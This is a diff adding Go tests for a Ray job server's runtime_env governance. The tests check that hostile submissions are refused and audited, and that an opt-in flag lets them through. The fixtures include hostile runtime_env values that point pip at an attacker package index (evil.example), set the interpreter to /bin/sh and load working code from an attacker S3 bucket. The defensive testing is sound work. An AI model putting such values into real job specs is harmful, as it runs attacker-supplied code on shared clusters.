@@ -577,3 +577,76 @@ func statusOf(t *testing.T, err error) int {
 	}
 	return he.Status
 }
+
+// runtime_env governance (#53): a runtime_env_yaml that the platform rule
+// set refuses is a 400 with a runtime_env_rejected deny audit row and no
+// persisted job; a governed document is admitted and stored verbatim;
+// RuntimeEnvUngoverned (the --allow-ungoverned-runtime-env DANGER flag)
+// restores the pre-#53 passthrough for upgraders.
+func TestSubmitJobGovernsRuntimeEnvYaml(t *testing.T) {
+	store := newMemStore(t)
+	s := &Server{Store: store}
+	admin := testIdentity("admin", auth.RoleAdmin)
+	ctx := context.Background()
+
+	submitWithEnv := func(jobID, env string) error {
+		body := jobBodyFor("team-a")
+		body.Id = strPtr(jobID)
+		body.Spec.RuntimeEnvYaml = &env
+		_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
+		return err
+	}
+
+	// The epic's canonical attack: pip_install_options redirecting the
+	// package index. Refused, audited, nothing persisted.
+	err := submitWithEnv("job-evil", "pip:\n  packages: [torch==2.1.0]\n  pip_install_options: [--index-url, https://evil.example/simple]")
+	mustHTTPError(t, err, http.StatusBadRequest)
+	rows, _, aerr := store.ListAudit(ctx, core.AuditFilter{})
+	if aerr != nil {
+		t.Fatal(aerr)
+	}
+	denied := false
+	for _, r := range rows {
+		if r.Event.Decision == core.AuditDecisionDeny && r.Event.Reason != nil &&
+			*r.Event.Reason == "runtime_env_rejected" && r.Event.Action != nil && *r.Event.Action == "submit_job" {
+			denied = true
+		}
+	}
+	if !denied {
+		t.Fatal("expected a submit_job audit deny with reason runtime_env_rejected")
+	}
+	if j, _ := store.GetRayJob(ctx, "job-evil"); j != nil {
+		t.Fatal("a refused submit must not persist a job row")
+	}
+
+	// A governed document (pinned pip, env_vars, capped timeout, local
+	// working_dir) is admitted and rides the stored spec verbatim, exactly
+	// as the passthrough carried it before — governance validates, it does
+	// not rewrite.
+	legal := "pip: [torch==2.1.0]\nenv_vars:\n  OMP_NUM_THREADS: \"4\"\nconfig:\n  setup_timeout_seconds: 300\nworking_dir: ./src"
+	if err := submitWithEnv("job-ok", legal); err != nil {
+		t.Fatalf("governed-legal env refused: %v", err)
+	}
+	stored, _ := store.GetRayJob(ctx, "job-ok")
+	if stored == nil || stored.Spec.RuntimeEnvYaml != legal {
+		t.Fatalf("stored env = %q, want the submitted document verbatim", stored.Spec.RuntimeEnvYaml)
+	}
+}
+
+func TestSubmitJobRuntimeEnvUngovernedRestoresPassthrough(t *testing.T) {
+	store := newMemStore(t)
+	s := &Server{Store: store, RuntimeEnvUngoverned: true}
+	admin := testIdentity("admin", auth.RoleAdmin)
+
+	evil := "py_executable: /bin/sh\npip:\n  packages: [torch]\n  pip_install_options: [--index-url, https://evil.example/simple]\nworking_dir: s3://attacker/code.zip"
+	body := jobBodyFor("team-a")
+	body.Id = strPtr("job-raw")
+	body.Spec.RuntimeEnvYaml = &evil
+	if _, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body}); err != nil {
+		t.Fatalf("ungoverned mode must pass any runtime_env through: %v", err)
+	}
+	stored, _ := store.GetRayJob(context.Background(), "job-raw")
+	if stored == nil || stored.Spec.RuntimeEnvYaml != evil {
+		t.Fatalf("stored env = %+v, want the verbatim passthrough", stored)
+	}
+}
